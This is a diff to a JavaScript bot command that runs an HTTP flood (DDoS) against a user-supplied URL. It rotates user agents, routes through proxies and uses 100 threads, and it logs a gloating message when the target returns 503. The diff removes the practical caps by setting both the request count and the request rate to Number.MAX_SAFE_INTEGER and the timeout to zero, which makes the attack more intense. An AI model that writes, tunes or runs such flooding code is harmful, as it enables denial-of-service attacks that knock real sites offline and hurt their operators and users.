@@ -64,8 +64,8 @@ const acceptHeader = [
     "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
 ];
 
-const maxRequests = 10000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000; // Set the max number of requests
-const requestsPerSecond = 10000; // Requests per second
+const maxRequests = Number.MAX_SAFE_INTEGER; // Set the max number of requests
+const requestsPerSecond = Number.MAX_SAFE_INTEGER; // Requests per second
 const numThreads = 100; // Number of threads
 
 function randElement(arr) {
@@ -109,7 +109,7 @@ module.exports["run"] = async ({ args, chat, font }) => {
             headers["User-Agent"] = generateUserAgent();
 
             axios
-                .get(url, { httpAgent: agent || null, headers, timeout: 1 })
+                .get(url, { httpAgent: agent || null, headers, timeout: 0 })
                 .then((response) => {
                     if (response.status === 503) {
                         chat.log("DDOS STATUS 503 BOOM BAGSAK!")
